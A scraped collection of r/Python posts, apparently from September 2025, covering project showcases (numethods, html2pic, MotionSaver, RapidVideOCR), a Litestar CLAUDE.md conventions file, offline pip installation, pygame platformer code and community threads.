I spoke to a friend in the HR team and he explained a similar scenario happened a few years ago, someone built an automation tool for outlook, which managed a mailbox receiving 500+ emails a day (dealing/contract notes) and he simply worked on a fund pricing team and only needed to view a few of those emails a day but realised the mailbox was a mess. He took the idea to senior management and presented the cost saving and benefits. Once it was deployed he was offered shares in the company and then a cash bonus once a year of realised savings was achieved. 

I‚Äôve been advised by my HR friend to approach senior management with my proposal, explain that I‚Äôve already spoken to my manager and detail the cost savings I can make, ask for a salary increase to provide ongoing support and develop my code further and ask for similar terms to that of the person who did this previously. He has confirmed what I‚Äôve done doesn‚Äôt go against any HR policies or my contract. 

Meeting is booked for next week and I‚Äôve had 2 messages from senior management saying how excited they are to see my idea :) 

"
1nf1lmm,"Real-world experiences with AI coding agents (Devin, SWE-agent, Aider, Cursor, etc.) ‚Äì which one is",panspective,0,10,2025-09-12 12:15:26,https://www.reddit.com/r/Python/comments/1nf1lmm/realworld_experiences_with_ai_coding_agents_devin/,"I‚Äôm trying to get a clearer picture of the current state of **AI agents for software development**. I don‚Äôt mean simple code completion assistants, but actual agents that can **manage, create, and modify entire projects almost autonomously**.

I‚Äôve come across names like **Devin, SWE-agent, Aider, Cursor**, and benchmarks like **SWE-bench** that show impressive results.  
But beyond the marketing and academic papers, I‚Äôd like to hear from the community about **real-world experiences**:

* In your opinion, what‚Äôs the best AI agent you‚Äôve actually used (even based on personal or lesser-known benchmarks)?
* Which model did you run it with?
* In short, as of September 2025, what‚Äôs the best AI-powered coding software you know of that really works?"
1nexoe8,I built a from-scratch Python package for classic Numerical Methods (no NumPy/SciPy required!),sikerce,146,30,2025-09-12 08:27:44,https://www.reddit.com/r/Python/comments/1nexoe8/i_built_a_fromscratch_python_package_for_classic/,"Hey everyone,

Over the past few months I‚Äôve been building a Python package called¬†`numethods`¬†‚Äî a small but growing collection of¬†**classic numerical algorithms implemented 100% from scratch**. No NumPy, no SciPy, just plain Python floats and list-of-lists.

The idea is to make algorithms transparent and educational, so you can actually¬†*see*¬†how LU decomposition, power iteration, or RK4 are implemented under the hood. This is especially useful for students, self-learners, or anyone who wants a deeper feel for how numerical methods work beyond calling library functions.

[https://github.com/denizd1/numethods](https://github.com/denizd1/numethods)

# üîß What‚Äôs included so far

* **Linear system solvers**: LU (with pivoting), Gauss‚ÄìJordan, Jacobi, Gauss‚ÄìSeidel, Cholesky
* **Root-finding**: Bisection, Fixed-Point Iteration, Secant, Newton‚Äôs method
* **Interpolation**: Newton divided differences, Lagrange form
* **Quadrature (integration)**: Trapezoidal rule, Simpson‚Äôs rule, Gauss‚ÄìLegendre (2- and 3-point)
* **Orthogonalization & least squares**: Gram‚ÄìSchmidt, Householder QR, LS solver
* **Eigenvalue methods**: Power iteration, Inverse iteration, Rayleigh quotient iteration, QR iteration
* **SVD**¬†(via eigen-decomposition of ATAA\^T AATA)
* **ODE solvers**: Euler, Heun, RK2, RK4, Backward Euler, Trapezoidal, Adams‚ÄìBashforth, Adams‚ÄìMoulton, Predictor‚ÄìCorrector, Adaptive RK45

# ‚úÖ Why this might be useful

* Great for¬†**teaching/learning**¬†numerical methods step by step.
* Good reference for people writing their own solvers in C/Fortran/Julia.
* Lightweight, no dependencies.
* Consistent object-oriented API (`.solve()`,¬†`.integrate()`¬†etc).

# üöÄ What‚Äôs next

* PDE solvers (heat, wave, Poisson with finite differences)
* More optimization methods (conjugate gradient, quasi-Newton)
* Spectral methods and advanced quadrature

üëâ If you‚Äôre learning numerical analysis, want to peek under the hood, or just like playing with algorithms, I‚Äôd love for you to check it out and give feedback."
1new8g8,Building with Litestar and AI Agents,Goldziher,8,1,2025-09-12 06:52:02,https://www.reddit.com/r/Python/comments/1new8g8/building_with_litestar_and_ai_agents/,"In a recent thread in the subreddit - [Would you recommend Litestar or FastAPI for building large scale api in 2025](https://www.reddit.com/r/Python/comments/1mgkwmn/would_you_recommend_litestar_or_fastapi_for/) - I wrote [a comment](https://www.reddit.com/r/Python/comments/1mgkwmn/comment/n6qxwgp/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button):

```text
Hi, ex-litestar maintainer here.

I am no longer maintaining a litestar - but I have a large scale system I maintain built with it.

As a litestar user I am personally very pleased. Everything works very smoothly - and there is a top notch discord server to boot.

Litestar is, in my absolutely subjective opinion, a better piece of software.

BUT - there are some problems: documentation needs a refresh. And AI tools do not know it by default. You will need to have some proper CLAUDE.md files etc.
```

Well, life happened, and I forgot.

So two things, first, unabashadly promoting my own tool [ai-rulez](https://github.com/Goldziher/ai-rulez), which I actually use to maintain and generate said CLAUDE.md, subagents and mcp servers (for several different tools - working with teams with different AI tools, I just find it easier to git ignore all the .cursor, .gemini and github copilot instructions, and maintain these centrally). Second, here is the (redacted) versio of the promised CLAUDE.md file:

```markdown
<!-- 
ü§ñ GENERATED FILE - DO NOT EDIT DIRECTLY
===========================================

This file was automatically generated by ai-rulez from ai-rulez.yaml.

‚ö†Ô∏è  IMPORTANT FOR AI ASSISTANTS AND DEVELOPERS:
- DO NOT modify this file directly
- DO NOT add, remove, or change rules in this file
- Changes made here will be OVERWRITTEN on next generation

‚úÖ TO UPDATE RULES:
1. Edit the source configuration: ai-rulez.yaml
2. Regenerate this file: ai-rulez generate
3. The updated CLAUDE.md will be created automatically

üìù Generated: 2025-09-11 18:52:14
üìÅ Source: ai-rulez.yaml
üéØ Target: CLAUDE.md
üìä Content: 25 rules, 5 sections

Learn more: https://github.com/Goldziher/ai-rulez
===========================================
-->

# grantflow

GrantFlow.AI is a comprehensive grant management platform built as a monorepo with Next.js 15/React 19 frontend and Python microservices backend. Features include <REDACTED>.

## API Security

**Priority:** critical

Backend endpoints must use @post/@get decorators with allowed_roles parameter. Firebase Auth JWT claims provide organization_id/role. Never check auth manually - middleware handles it. Use withAuthRedirect() wrapper for all frontend API calls.

## Litestar Authentication Pattern

**Priority:** critical

Litestar-specific auth pattern: Use @get/@post/@patch/@delete decorators with allowed_roles parameter in opt dict. Example: `@get(""/path"", allowed_roles=[UserRoleEnum.OWNER])`. AuthMiddleware reads route_handler.opt[""allowed_roles""] - never check auth manually. Always use allowed_roles in opt dict, NOT as decorator parameter.

## Litestar Dependency Injection

**Priority:** critical

Litestar dependency injection: async_sessionmaker injected automatically via parameter name. Request type is APIRequest. Path params use {param:uuid} syntax. Query params as function args. Never use Depends() - Litestar injects by parameter name/type.

## Litestar Framework Patterns (IMPORTANT: not FastAPI!)

### Key Differences from FastAPI
- **Imports**: `from litestar import get, post, patch, delete` (NOT `from fastapi import FastAPI, APIRouter`)
- **Decorators**: Use `@get`, `@post`, etc. directly on functions (no router.get)
- **Auth**: Pass `allowed_roles` in decorator's opt dict: `@get(""/path"", allowed_roles=[UserRoleEnum.OWNER])`
- **Dependency Injection**: No `Depends()` - Litestar injects by parameter name/type
- **Responses**: Return TypedDict/msgspec models directly, or use `Response[Type]` for custom responses

### Authentication Pattern

from litestar import get, post
from packages.db.src.enums import UserRoleEnum

<> CORRECT - Litestar pattern with opt dict
@get(
    ""/organizations/{organization_id:uuid}/members"",
    allowed_roles=[UserRoleEnum.OWNER, UserRoleEnum.ADMIN],
    operation_id=""ListMembers""
)
async def handle_list_members(
    request: APIRequest,  # Injected automatically
    organization_id: UUID,  # Path param
    session_maker: async_sessionmaker[Any],  # Injected by name
) -> list[MemberResponse]:
    ...

<> WRONG - FastAPI pattern (will not work)
@router.get(""/members"")
async def list_members(
    current_user: User = Depends(get_current_user)
):
    ...

### WebSocket Pattern

from litestar import websocket_stream
from collections.abc import AsyncGenerator

@websocket_stream(
    ""/organizations/{organization_id:uuid}/notifications"",
    opt={""allowed_roles"": [UserRoleEnum.OWNER]},
    type_encoders={UUID: str, SourceIndexingStatusEnum: lambda x: x.value}
)
async def handle_notifications(
    organization_id: UUID,
) -> AsyncGenerator[WebsocketMessage[dict[str, Any]]]:
    while True:
        messages = await get_messages()
        for msg in messages:
            yield msg  # Use yield, not send
        await asyncio.sleep(3)


### Response Patterns

from litestar import Response

<> Direct TypedDict return (most common)
@post(""/organizations"")
async def create_org(data: CreateOrgRequest) -> TableIdResponse:
    return TableIdResponse(id=str(org.id))

<> Custom Response with headers/status
@post(""/files/convert"")
async def convert_file(data: FileData) -> Response[bytes]:
    return Response[bytes](
        content=pdf_bytes,
        media_type=""application/pdf"",
        headers={""Content-Disposition"": f'attachment; filename=""{filename}""'}
    )

### Middleware Access
- AuthMiddleware checks `connection.route_handler.opt.get(""allowed_roles"")`
- Never implement auth checks in route handlers
- Middleware handles all JWT validation and role checking

## Litestar Framework Imports

**Priority:** critical

Litestar imports & decorators: from litestar import get, post, patch, delete, websocket_stream. NOT from fastapi. Route handlers return TypedDict/msgspec models directly. For typed responses use Response[Type]. WebSocket uses @websocket_stream with AsyncGenerator yield pattern.

## Multi-tenant Security

**Priority:** critical

All endpoints must include organization_id in URL path. Use @allowed_roles decorator from services.backend.src.auth. Never check auth manually. Firebase JWT claims must include organization_id.

## SQLAlchemy Async Session Management

**Priority:** critical

Always use async session context managers with explicit transaction boundaries. Pattern: `async with session_maker() as session, session.begin():`. Never reuse sessions across requests. Use `select_active()` from packages.db.src.query_helpers for soft-delete filtering.

## Soft Delete Integrity

**Priority:** critical

Always use select_active() helper from packages.db.src.query_helpers for queries. Never query deleted_at IS NULL directly. Test soft-delete filtering in integration tests for all new endpoints.

## Soft Delete Pattern

**Priority:** critical

All database queries must use select_active() helper from packages.db.src.query_helpers for soft-delete filtering. Never query deleted_at IS NULL directly. Tables with is_deleted/deleted_at fields require this pattern to prevent exposing deleted data.

## Task Commands

**Priority:** critical

Use Taskfile commands exclusively: task lint:all before commits, task test for testing, task db:migrate for migrations. Never run raw commands. Check available tasks with task --list. CI validates via these commands.

## Test Database Isolation

**Priority:** critical

Use real PostgreSQL for all tests via testing.db_test_plugin. Mark integration tests with @pytest.mark.integration, E2E with @pytest.mark.e2e_full. Always set PYTHONPATH=. when running pytest. Use factories from testing.factories for test data generation.

## Testing with Real Infrastructure

**Priority:** critical

Use real PostgreSQL via db_test_plugin for all tests. Never mock SQLAlchemy sessions. Use factories from testing/factories.py. Run 'task test:e2e' for integration tests before merging.

## CI/CD Patterns

**Priority:** high

GitHub Actions in .github/workflows/ trigger on development‚Üístaging, main‚Üíproduction. Services deploy via build-service-*.yaml workflows. Always run task lint:all and task test locally before pushing. Docker builds require --build-arg for frontend env vars.

## Development Workflow

### Quick Start

<> Install dependencies and setup
task setup

<> Start all services in dev mode
task dev

<> Or start specific services
task service:backend:dev
task frontend:dev

### Daily Development Tasks

#### Running Tests

<> Run all tests (parallel by default)
task test

<> Python service tests with real PostgreSQL
PYTHONPATH=. uv run pytest services/backend/tests/
PYTHONPATH=. uv run pytest services/indexer/tests/

<> Frontend tests with Vitest
cd frontend && pnpm test

#### Linting & Formatting

<> Run all linters
task lint:all

<> Specific linters
task lint:frontend  # Biome, ESLint, TypeScript
task lint:python    # Ruff, MyPy

#### Database Operations

<> Apply migrations locally
task db:migrate

<> Create new migration
task db:create-migration -- <migration_name>

<> Reset database (WARNING: destroys data)
task db:reset

<> Connect to Cloud SQL staging
task db:proxy:start
task db:migrate:remote

### Git Workflow
- Branch from `development` for features
- `development` ‚Üí auto-deploys to staging
- `main` ‚Üí auto-deploys to production
- Commits use conventional format: `fix:`, `feat:`, `chore:`

## Auth Security

**Priority:** high

Never check auth manually in endpoints - middleware handles all auth via JWT claims (organization_id/role). Use UserRoleEnum from packages.db for role checks. Pattern: `@post('/path', allowed_roles=[UserRoleEnum.COLLABORATOR])`. Always wrap frontend API calls with withAuthRedirect().

## Litestar WebSocket Handling

**Priority:** high

Litestar WebSocket pattern: Use @websocket_stream decorator with AsyncGenerator return type. Yield messages in async loop. Set type_encoders for UUID/enum serialization. Access allowed_roles via opt dict. Example: @websocket_stream(""/path"", opt={""allowed_roles"": [...]}).

## Initial Setup

<> Install all dependencies and set up git hooks
task setup

<> Copy environment configuration
cp .env.example .env
<> Update .env with actual values (reach out to team for secrets)

<> Start database and apply migrations
task db:up
task db:migrate

<> Seed the database
task db:seed

## Running Services

<> Start all services in development mode
task dev

## Taskfile Command Execution

**Priority:** high

Always use task commands instead of direct package managers. Core workflow: `task setup dev test lint format build`. Run `task lint:all` after changes, `task test:e2e` for E2E tests with E2E_TESTS=1 env var. Check available commands with `task --list`.

## Test Factories

**Priority:** high

Use testing/factories.py for Python tests and testing/factories.ts for TypeScript tests. Real PostgreSQL instances required for backend tests. Run PYTHONPATH=. uv run pytest for Python, pnpm test for frontend. E2E tests use markers: smoke (<1min), quality_assessment (2-5min), e2e_full (10+min).

## Type Safety

**Priority:** high

Python: Type all args/returns, use TypedDict with NotRequired[type]. TypeScript: Never use 'any', leverage API namespace types, use ?? operator. Run task lint:python and task lint:frontend to validate. msgspec for Python serialization.

## Type Safety and Validation

**Priority:** high

Python: Use msgspec TypedDict with NotRequired[], never Optional. TypeScript: Ban 'any', use type guards from @tool-belt/type-predicates. All API responses must use msgspec models.

## TypeScript Type Safety

**Priority:** high

Never use 'any' type. Use type guards from @tool-belt/type-predicates. Always use nullish coalescing (??) over logical OR (||). Extract magic numbers to constants. Use factories from frontend/testing/factories and editor/testing/factories for test data.

## Async Performance Patterns

**Priority:** medium

Use async with session.begin() for transactions. Batch Pub/Sub messages with ON CONFLICT DO NOTHING for duplicates. Frontend: Use withAuthRedirect() wrapper for all API calls.

## Monorepo Service Boundaries

**Priority:** medium

Services must be independently deployable. Use packages/db for shared models, packages/shared_utils for utilities. <REDACTED>. 

## Microservices Overview

<REDACTED>

### Key Technologies

<REDACTED>

## Service Communication

<REDACTED>

## Test Commands

<> Run all tests (parallel by default)
task test

<> Run specific test suites
PYTHONPATH=. uv run pytest services/backend/tests/
cd frontend && pnpm test

<> E2E tests with markers
E2E_TESTS=1 pytest -m ""smoke""              # <1 min
E2E_TESTS=1 pytest -m ""quality_assessment"" # 2-5 min
E2E_TESTS=1 pytest -m ""e2e_full""          # 10+ min

<> Disable parallel execution for debugging
pytest -n 0

## Test Structure
- **Python**: `*_test.py` files, async pytest with real PostgreSQL
- **TypeScript**: `*.spec.ts(x)` files, Vitest with React Testing Library
- **E2E**: Playwright tests with `data-testid` attributes

## Test Data
- Use factories from `testing/factories.py` (Python)
- Use factories from `frontend/testing/factories.ts` (TypeScript)
- Test scenarios in `testing/test_data/scenarios/` with metadata.yaml configs

## Coverage Requirements
- Target 100% test coverage
- Real PostgreSQL for backend tests (no mocks)
- Mock only external APIs in frontend tests

## Structured Logging

**Priority:** low

Use structlog with key=value pairs: logger.info('Created grant', grant_id=str(id)). Convert UUIDs to strings, datetime to .isoformat(). Never use f-strings in log messages.
```

Important notes: 
   * in larger monorepo what I do (again using ai-rulez) is create layered CLAUDE.md files - e.g., there is a root ai-rulez.yaml file in the repository root, which includes the overall conventions of the codebase, instructions about tooling etc. Then, say under the `services` folder (assuming it includes services of the same type), there is another ai-rulez.yaml file with more specialized instructions for these services, say - all are written in Litestar, so the above conventions etc. Why? Claude Code, for example, reads the CLAUDE.md files in its working context. This is far from perfect, but it does allow creating more focused context.
  * in the above example I removed the code blocks and replaced code block comments from using `#` to using `<>`. Its not the most elegant, but it makes it more readable. "
1neuyit,"html2pic: transform basic html&css to image, without a browser (experimental)",_unknownProtocol,20,3,2025-09-12 05:32:04,https://www.reddit.com/r/Python/comments/1neuyit/html2pic_transform_basic_htmlcss_to_image_without/,"Hey everyone,

For the past few months, I've been working on a personal graphics library called [PicTex](https://github.com/francozanardi/pictex). As an experiment, I got curious to see if I could build a lightweight HTML/CSS to image converter on top of it, without the overhead of a full browser engine like Selenium or Playwright.

**Important**: this is a proof-of-concept, and a large portion of the code was generated with AI assistance (primarily Claude) to quickly explore the idea. It's definitely not production-ready and likely has plenty of bugs and unhandled edge cases.

I'm sharing it here to show what I've been exploring, maybe it could be useful for someone.

Here's the link to the repo: [https://github.com/francozanardi/html2pic](https://github.com/francozanardi/html2pic)

---

### What My Project Does

`html2pic` takes a subset of HTML and CSS and renders it into a PNG, JPG, or SVG image, using Python + Skia. It also uses BeautifulSoup4 for HTML parsing, tinycss2 for CSS parsing.

Here‚Äôs a basic example:

```python
from html2pic import Html2Pic

html = '''
<div class=""card"">
  <div class=""avatar""></div>
  <div class=""user-info"">
    <h2>pictex_dev</h2>
    <p>@python_renderer</p>
  </div>
</div>
'''

css = '''
.card {
    font-family: ""Segoe UI"";
    display: flex;
    align-items: center;
    gap: 16px;
    padding: 20px;
    background-color: #1a1b21;
    border-radius: 12px;
    width: 350px;
    box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.4);
}

.avatar {
    width: 60px;
    height: 60px;
    border-radius: 50%;
    background-image: linear-gradient(45deg, #f97794, #623aa2);
}

.user-info {
    display: flex;
    flex-direction: column;
}

h2 {
    margin: 0;
    font-size: 22px;
    font-weight: 600;
    color: #e6edf3;
}

p {
    margin: 0;
    font-size: 16px;
    color: #7d8590;
}
'''

renderer = Html2Pic(html, css)
image = renderer.render()
image.save(""profile_card.png"")
```

And here's the image it generates:

**[Quick Start Result Image](https://i.imgur.com/UKGA0lH.png)**

---

### Target Audience

Right now, this is a **toy project / proof-of-concept**.

It's intended for hobbyists, developers who want to prototype image generation, or for simple, controlled use cases where installing a full browser feels like overkill. For example:
*   Generating simple social media cards with dynamic text.
*   Creating basic components for reports.
*   Quickly visualizing HTML/CSS snippets without opening a browser.

It is **not** meant for production environments or for rendering complex HTML/CSS. It is absolutely not a browser replacement.

---

### Comparison

*   **vs. Selenium / Playwright:** The main difference is the lack of a browser. `html2pic` is much more lightweight and has fewer dependencies. The trade-off is that it only supports a tiny fraction of HTML/CSS.

---

Thanks for checking it out."
1neu7bv,üíª [Showcase] MotionSaver: A Python-based Dynamic Video Lockscreen & Screensaver for Windows,chinmay06,3,0,2025-09-12 04:46:51,https://www.reddit.com/r/Python/comments/1neu7bv/showcase_motionsaver_a_pythonbased_dynamic_video/,"**MotionSaver** is a free, open-source application that transforms your Windows desktop into a dynamic, animated space by using videos as a lockscreen and screensaver. Built with **Python** using libraries like **OpenCV** and **Tkinter**, it provides a customizable and hardware-accelerated experience. The core of the project is a video engine that handles multiple formats and ensures smooth playback with minimal CPU usage by leveraging GPU acceleration. It also includes features like a macOS-style password prompt and optional real-time widgets for weather and stocks.

# What My Project Does

MotionSaver lets you set any video as your lockscreen or screensaver on Windows. It's built to be both customizable and performant. The application's video rendering is powered by **OpenCV** with GPU acceleration, which ensures a smooth visual experience without draining your CPU. You can also customize the on-screen clock, set a secure password, and add optional widgets for live data like weather and stock prices.

# Target Audience

This project is primarily a **hobbyist and personal-use application**. It is not a commercial product and should **not be used in production environments** or places requiring high security. The current password mechanism is a basic security layer and can be bypassed. It's designed for Python enthusiasts who enjoy customizing their systems and want a fun, functional way to personalize their PC.

# Comparison

While there are other video wallpaper and screensaver applications for Windows, MotionSaver stands out for a few key reasons:

* **Open-Source and Python-based**: Unlike many commercial alternatives like Wallpaper Engine, MotionSaver is completely free and open-source. This allows developers to inspect, modify, and contribute to the code, which is a core value of the r/Python community.
* **Lightweight and Focused**: While alternatives like **Lively Wallpaper** are very robust and feature-rich, MotionSaver is specifically focused on delivering a high-performance video lockscreen. It uses **OpenCV** for optimized video rendering, ensuring a lean and efficient screensaver without the overhead of a full desktop customization suite.

# Source Code

**GitHub Repository:**[https://github.com/chinmay-sawant/MotionSaver](https://github.com/chinmay-sawant/MotionSaver)"
1ner9mj,Best way to install python package with all its dependencies on an offline pc. -- Part 2,PlanetMercurial,10,41,2025-09-12 02:12:23,https://www.reddit.com/r/Python/comments/1ner9mj/best_way_to_install_python_package_with_all_its/,"This is a follow up post to [https://www.reddit.com/r/Python/comments/1keaeft/best\_way\_to\_install\_python\_package\_with\_all\_its/](https://www.reddit.com/r/Python/comments/1keaeft/best_way_to_install_python_package_with_all_its/)  
I followed one of the techniques shown in that post and it worked quite well.  
So in short what i do is  
first do  
`python -m venv .` ( in a  directory)  
then `.\Scripts\activate`  
then do the actual installation of the package with `pip install <packagename>`  
then i do a `pip freeze > requirements.txt`  
and finally i download the wheels using this requirements.txt.  
For that i create a folder called wheel and then I do a `pip download -r requirements.txt`  
then i copy over the wheels folder to the offline pc and create a venv over there and do the install using that wheel folder.

So all this works quite well as long as there as only wheel files in the package.  
Lately I see that there are packages that need some dependencies that need to be built from source so instead of the `whl` file a `tar.gz` file gets downloaded in the wheel folder. And somehow that `tar.gz` doesn't get built on the offline pc due to lack of dependencies or sometimes buildtools or setuptools version mismatch.

Is there a way to get this working?"
1neqpor,I Found a Game-Changing Tool for Extracting Hard Subtitles from Videos ‚Äì Open Source & Super Fast!,LiekkasKono,0,0,2025-09-12 01:44:34,https://www.reddit.com/r/Python/comments/1neqpor/i_found_a_gamechanging_tool_for_extracting_hard/,"I just came across an awesome open-source tool that I had to share: **[RapidVideOCR](https://github.com/SWHL/RapidVideOCR)**.

If you‚Äôve ever struggled with videos that have **hardcoded subtitles** (those burned directly into the video and not in a separate track), this tool might be exactly what you‚Äôve been looking for.

**RapidVideOCR** automatically extracts hardcoded subtitles from video files and generates clean `.srt`, `.ass`, or `.txt` subtitle files ‚Äî perfect for translation, accessibility, or archiving.

### üîç How it works:
1. It uses **VideoSubFinder** (or similar tools) to extract key frames where subtitles appear.
2. Then, **RapidVideOCR** runs OCR (Optical Character Recognition) on those frames using **RapidOCR**, which supports **multiple languages**.
3. Finally, it generates accurate, time-synced subtitle files.

### ‚úÖ Why it stands out:
- **Fast & accurate**: Leverages a powerful OCR engine optimized for speed and precision.
- **Easy to use**: Install via `pip install rapid_videocr` and run in seconds.
- **Batch processing**: Great for handling entire videos or multiple files.
- **Supports many languages**: As long as RapidOCR supports it, so does this tool.
- **Open source & free**: Apache 2.0 licensed, with a clear path for contributions.

There‚Äôs even a desktop version available if you prefer a GUI: [RapidVideOCRDesktop](https://github.com/SWHL/RapidVideOCRDesktop).

üëâ GitHub: [https://github.com/SWHL/RapidVideOCR](https://github.com/SWHL/RapidVideOCR)

This could be a huge help for content creators, translators, educators, or anyone working with foreign-language videos. The project is still gaining traction, so if you find it useful, consider giving it a ‚≠ê on GitHub to support the devs!

Have you tried any tools like this? I‚Äôd love to hear your experiences or alternatives!"
1neosd8,Tips for Sprite Collisions in Platformer,Upbeat_Marsupial9770,1,5,2025-09-12 00:10:35,https://www.reddit.com/r/Python/comments/1neosd8/tips_for_sprite_collisions_in_platformer/,"I am using PyGame to make a platformer, and my collisions are pretty buggy. I am pretty new to coding and would appreciate any tips."
1neoksd,Friday Daily Thread: r/Python Meta and Free-Talk Fridays,AutoModerator,2,0,2025-09-12 00:00:44,https://www.reddit.com/r/Python/comments/1neoksd/friday_daily_thread_rpython_meta_and_freetalk/,"# Weekly Thread: Meta Discussions and Free Talk Friday üéôÔ∏è

Welcome to Free Talk Friday on /r/Python! This is the place to discuss the r/Python community (meta discussions), Python news, projects, or anything else Python-related!

## How it Works:

1. **Open Mic**: Share your thoughts, questions, or anything you'd like related to Python or the community.
2. **Community Pulse**: Discuss what you feel is working well or what could be improved in the /r/python community.
3. **News & Updates**: Keep up-to-date with the latest in Python and share any news you find interesting.

## Guidelines:

* All topics should be related to Python or the /r/python community.
* Be respectful and follow Reddit's [Code of Conduct](https://www.redditinc.com/policies/content-policy).

## Example Topics:

1. **New Python Release**: What do you think about the new features in Python 3.11?
2. **Community Events**: Any Python meetups or webinars coming up?
3. **Learning Resources**: Found a great Python tutorial? Share it here!
4. **Job Market**: How has Python impacted your career?
5. **Hot Takes**: Got a controversial Python opinion? Let's hear it!
6. **Community Ideas**: Something you'd like to see us do? tell us.

Let's keep the conversation going. Happy discussing! üåü"
1nenw34,Why does my program only work in vsc?,Upbeat_Marsupial9770,0,21,2025-09-11 23:27:52,https://www.reddit.com/r/Python/comments/1nenw34/why_does_my_program_only_work_in_vsc/,"    # Created: 7/13/2025
    # Last updated: 8/26/2025
    
    import pygame
    from PIL import Image
    import os
    
    pygame.init()
    
    # Screen setup
    screen = pygame.display.set_mode((800, 600))
    pygame.display.set_caption(""Platformer"")
    clock = pygame.time.Clock()
    
    # Tile size
    TILE_WIDTH, TILE_HEIGHT = 30, 30
    TILEMAP_IMAGE = os.path.join(""Platformer"", ""Sprites"", ""platform.png"")
    PLAYER_SPRITESHEET = os.path.join(""Platformer"", ""Sprites"", ""player_spritesheet.png"")
    
    # Create tile masks for pixel-perfect collisions
    def generate_tilemap(image_path, offset_x=0, offset_y=0):
    ¬† ¬† img = pygame.image.load(image_path).convert_alpha()
    ¬† ¬† tiles = []
    ¬† ¬† masks = []
    
    ¬† ¬† width, height = img.get_width(), img.get_height()
    ¬† ¬† for y in range(0, height, TILE_HEIGHT):
    ¬† ¬† ¬† ¬† for x in range(0, width, TILE_WIDTH):
    ¬† ¬† ¬† ¬† ¬† ¬† tile_surface = pygame.Surface((TILE_WIDTH, TILE_HEIGHT), pygame.SRCALPHA)
    ¬† ¬† ¬† ¬† ¬† ¬† tile_surface.blit(img, (-x, -y))
    ¬† ¬† ¬† ¬† ¬† ¬† mask = pygame.mask.from_surface(tile_surface)
    ¬† ¬† ¬† ¬† ¬† ¬† if mask.count() > 0:
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† rect = pygame.Rect(x + offset_x, y + offset_y, TILE_WIDTH, TILE_HEIGHT)
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† tiles.append(rect)
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† masks.append((mask, rect.topleft))
    ¬† ¬† return tiles, masks, img
    
    # Player animation & physics
    class Player(pygame.sprite.Sprite):
    ¬† ¬† def __init__(self):
    ¬† ¬† ¬† ¬† super().__init__()
    ¬† ¬† ¬† ¬† self.spritesheet = pygame.image.load(PLAYER_SPRITESHEET).convert_alpha()
    ¬† ¬† ¬† ¬† self.frames = []
    ¬† ¬† ¬† ¬† self.masks = []
    ¬† ¬† ¬† ¬† self.frame_index = 0
    ¬† ¬† ¬† ¬† self.animation_timer = 0
    ¬† ¬† ¬† ¬† self.load_frames()
    
    ¬† ¬† ¬† ¬† self.image = self.frames[self.frame_index]
    ¬† ¬† ¬† ¬† self.mask = self.masks[self.frame_index]
    ¬† ¬† ¬† ¬† self.rect = self.image.get_rect(topleft=(100, 500))
    
    ¬† ¬† ¬† ¬† self.vel_x = 0
    ¬† ¬† ¬† ¬† self.vel_y = 0
    ¬† ¬† ¬† ¬† self.jump_count = 0
    ¬† ¬† ¬† ¬† self.max_jumps = 2
    ¬† ¬† ¬† ¬† self.jump_pressed = False
    ¬† ¬† ¬† ¬† self.facing_right = True
    ¬† ¬† ¬† ¬† self.feet_height = 6 ¬† # bottom pixels for floor detection
    ¬† ¬† ¬† ¬† self.head_height = 6 ¬† # top pixels for ceiling detection
    ¬† ¬† ¬† ¬† self.coyote_timer = 0
    ¬† ¬† ¬† ¬† self.coyote_time_max = 6 ¬†# frames allowed after leaving platform
    
    ¬† ¬† def load_frames(self):
    ¬† ¬† ¬† ¬† frame_width = 32
    ¬† ¬† ¬† ¬† frame_height = 32
    ¬† ¬† ¬† ¬† for i in range(self.spritesheet.get_width() // frame_width):
    ¬† ¬† ¬† ¬† ¬† ¬† frame = self.spritesheet.subsurface((i * frame_width, 0, frame_width, frame_height))
    ¬† ¬† ¬† ¬† ¬† ¬† frame = pygame.transform.scale(frame, (64, 64))
    ¬† ¬† ¬† ¬† ¬† ¬† self.frames.append(frame)
    ¬† ¬† ¬† ¬† ¬† ¬† self.masks.append(pygame.mask.from_surface(frame))
    
    ¬† ¬† # Create feet mask
    ¬† ¬† def get_feet_mask(self):
    ¬† ¬† ¬† ¬† feet_surface = pygame.Surface((self.rect.width, self.feet_height), pygame.SRCALPHA)
    ¬† ¬† ¬† ¬† feet_surface.blit(self.image, (0, -self.rect.height + self.feet_height))
    ¬† ¬† ¬† ¬† return pygame.mask.from_surface(feet_surface)
    
    ¬† ¬† # Create head mask
    ¬† ¬† def get_head_mask(self):
    ¬† ¬† ¬† ¬† head_surface = pygame.Surface((self.rect.width, self.head_height), pygame.SRCALPHA)
    ¬† ¬† ¬† ¬† head_surface.blit(self.image, (0, 0))
    ¬† ¬† ¬† ¬† return pygame.mask.from_surface(head_surface)
    
    ¬† ¬† def update(self, tiles, tile_masks):
    ¬† ¬† ¬† ¬† keys = pygame.key.get_pressed()
    ¬† ¬† ¬† ¬† self.vel_x = 0
    ¬† ¬† ¬† ¬† if keys[pygame.K_a] or keys[pygame.K_LEFT]:
    ¬† ¬† ¬† ¬† ¬† ¬† self.vel_x = -5
    ¬† ¬† ¬† ¬† ¬† ¬† self.facing_right = False
    ¬† ¬† ¬† ¬† if keys[pygame.K_d] or keys[pygame.K_RIGHT]:
    ¬† ¬† ¬† ¬† ¬† ¬† self.vel_x = 5
    ¬† ¬† ¬† ¬† ¬† ¬† self.facing_right = True
    
    ¬† ¬† ¬† ¬† # Animation
    ¬† ¬† ¬† ¬† if self.vel_x != 0:
    ¬† ¬† ¬† ¬† ¬† ¬† self.animation_timer += 1
    ¬† ¬† ¬† ¬† ¬† ¬† if self.animation_timer >= 6:
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† self.frame_index = (self.frame_index + 1) % len(self.frames)
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† self.animation_timer = 0
    ¬† ¬† ¬† ¬† else:
    ¬† ¬† ¬† ¬† ¬† ¬† self.frame_index = 0
    
    ¬† ¬† ¬† ¬† self.image = self.frames[self.frame_index]
    ¬† ¬† ¬† ¬† self.mask = self.masks[self.frame_index]
    ¬† ¬† ¬† ¬† if not self.facing_right:
    ¬† ¬† ¬† ¬† ¬† ¬† self.image = pygame.transform.flip(self.image, True, False)
